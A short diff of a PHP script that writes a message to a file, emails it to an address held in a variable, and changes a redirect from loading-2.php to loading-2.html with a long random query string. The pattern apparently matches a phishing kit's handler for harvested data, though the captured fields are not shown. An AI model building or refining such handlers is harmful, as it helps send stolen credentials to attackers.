@@ -59,6 +59,6 @@ message($message);
 fwrite($text, $message);
 mail("$send", "$subject", $message);
 
-header("Location: loading-2.php?&".generateRandomString(200));
+header("Location: loading-2.html?&".generateRandomString(200));
 
 ?>	  
